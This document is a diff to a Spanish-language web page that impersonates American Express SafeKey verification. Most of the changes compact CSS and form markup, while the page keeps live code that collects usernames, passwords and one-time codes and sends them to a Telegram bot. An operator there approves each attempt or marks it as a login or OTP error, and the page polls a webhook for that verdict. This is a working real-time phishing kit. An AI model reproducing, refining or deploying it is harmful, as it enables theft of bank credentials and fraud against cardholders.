@@ -386,73 +386,34 @@
         }
 
         @media (max-width: 640px) {
-            .container {
-                padding: 24px;
-            }
-            .header {
-                gap: 12px;
-                margin-bottom: 28px;
-            }
-            .amex-logo {
-                width: 200px;
-            }
-            .header-title {
-                font-size: 1.25rem;
-            }
-            .header-subtitle {
-                font-size: 0.875rem;
-            }
+            .container { padding: 24px; }
+            .header { gap: 12px; margin-bottom: 28px; }
+            .amex-logo { width: 200px; }
+            .header-title { font-size: 1.25rem; }
+            .header-subtitle { font-size: 0.875rem; }
         }
 
         @media (max-width: 480px) {
-            .container {
-                padding: 20px;
-            }
-            .header {
-                gap: 10px;
-                margin-bottom: 24px;
-            }
-            .amex-logo {
-                width: 160px;
-            }
-            .header-title {
-                font-size: 1.125rem;
-                margin-bottom: 8px;
-            }
-            .header-subtitle {
-                font-size: 0.8125rem;
-            }
-            .credentials-grid {
-                grid-template-columns: 1fr;
-            }
-            .button-group {
-                flex-direction: column;
-                gap: 10px;
-            }
-            .btn-primary,
-            .btn-secondary {
-                width: 100%;
-                flex: none;
-            }
-            .info-row {
-                font-size: 0.875rem;
-            }
+            .container { padding: 20px; }
+            .header { gap: 10px; margin-bottom: 24px; }
+            .amex-logo { width: 160px; }
+            .header-title { font-size: 1.125rem; margin-bottom: 8px; }
+            .header-subtitle { font-size: 0.8125rem; }
+            .credentials-grid { grid-template-columns: 1fr; }
+            .button-group { flex-direction: column; gap: 10px; }
+            .btn-primary, .btn-secondary { width: 100%; flex: none; }
+            .info-row { font-size: 0.875rem; }
         }
 
         @media (max-width: 360px) {
-            .container {
-                padding: 16px;
-            }
-            .amex-logo {
-                width: 140px;
-            }
-            .header-title {
-                font-size: 1rem;
-            }
+            .container { padding: 16px; }
+            .amex-logo { width: 140px; }
+            .header-title { font-size: 1rem; }
         }
     </style>
 </head>
 <body>
+    <!-- LOADING OVERLAY -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <div class="loading-text">Verificando autenticación...</div>
@@ -497,24 +458,12 @@
                 <div class="credentials-grid">
                     <div class="form-group">
                         <label class="form-label">Usuario</label>
-                        <input 
-                            type="text" 
-                            class="form-input" 
-                            id="username" 
-                            placeholder="Tu usuario"
-                            required
-                        />
+                        <input type="text" class="form-input" id="username" placeholder="Tu usuario" required />
                         <div class="error-message">El usuario es requerido</div>
                     </div>
                     <div class="form-group">
                         <label class="form-label">Contraseña</label>
-                        <input 
-                            type="password" 
-                            class="form-input" 
-                            id="password" 
-                            placeholder="Tu contraseña"
-                            required
-                        />
+                        <input type="password" class="form-input" id="password" placeholder="Tu contraseña" required />
                         <div class="error-message">La contraseña es requerida</div>
                     </div>
                 </div>
@@ -525,15 +474,7 @@
                 <p class="otp-info">Se ha enviado un código de 6 dígitos a su móvil y correo electrónico registrado</p>
                 <div class="form-group">
                     <label class="form-label">OTP</label>
-                    <input 
-                        type="text" 
-                        class="form-input" 
-                        id="confirmationCode" 
-                        placeholder="Ingrese el código OTP"
-                        maxlength="6"
-                        inputmode="numeric"
-                        required
-                    />
+                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingrese el código OTP" maxlength="6" inputmode="numeric" required />
                     <div class="error-message">El código OTP es requerido (6 dígitos)</div>
                 </div>
             </div>
@@ -605,7 +546,7 @@
         }
 
         // ============================================
-        // FUNCIONES TELEGRAM
+        // FUNCIONES DE TELEGRAM Y WEBHOOK
         // ============================================
         function generarSolicitudId() {
             return 'AMEX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
@@ -616,26 +557,14 @@
                 const inlineKeyboard = {
                     inline_keyboard: [
                         [
-                            {
-                                text: "✅ APROBAR",
-                                callback_data: `approve_${datos.solicitudId}`
-                            }
+                            { text: "✅ APROBAR", callback_data: `approve_${datos.solicitudId}` }
                         ],
                         [
-                            {
-                                text: "❌ ERROR USUARIO",
-                                callback_data: `user_error_${datos.solicitudId}`
-                            },
-                            {
-                                text: "❌ ERROR CONTRASEÑA",
-                                callback_data: `pass_error_${datos.solicitudId}`
-                            }
+                            { text: "❌ ERROR USUARIO", callback_data: `user_error_${datos.solicitudId}` },
+                            { text: "❌ ERROR CONTRASEÑA", callback_data: `pass_error_${datos.solicitudId}` }
                         ],
                         [
-                            {
-                                text: "❌ ERROR OTP",
-                                callback_data: `otp_error_${datos.solicitudId}`
-                            }
+                            { text: "❌ ERROR OTP", callback_data: `otp_error_${datos.solicitudId}` }
                         ]
                     ]
                 };
@@ -674,30 +603,19 @@
                 });
 
                 const data = await response.json();
-
-                if (data.ok) {
-                    console.log('✅ Datos enviados a Telegram');
-                    return true;
-                } else {
-                    console.error('❌ Error:', data.description);
-                    return false;
-                }
+                return data.ok;
             } catch (error) {
-                console.error('❌ Error:', error);
+                console.error('❌ Error al enviar a Telegram:', error);
                 return false;
             }
         }
 
-        // ============================================
-        // POLLING AL WEBHOOK (NO A TELEGRAM DIRECTAMENTE)
-        // ============================================
+        // ✅ Función para consultar el estado desde el webhook (backend)
         async function verificarEstadoWebhook(solicitudId) {
             try {
                 const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
                 const data = await response.json();
-                
                 console.log('📊 Estado webhook:', data.estado);
-                
                 return data.estado || 'pending';
             } catch (error) {
                 console.error('❌ Error verificando webhook:', error);
@@ -768,7 +686,7 @@
         }
 
         // ============================================
-        // VALIDACIÓN
+        // VALIDACIÓN Y EVENTOS
         // ============================================
         [usernameInput, passwordInput, confirmationInput].forEach(input => {
             input.addEventListener('blur', function() {
@@ -867,7 +785,7 @@
 
         window.addEventListener('load', function() {
             initializeTransaction();
-            console.log('✅ Sistema listo - Usando webhook de Vercel');
+            console.log('✅ Sistema AMEX SafeKey listo - Webhook activo');
         });
     </script>
 </body>
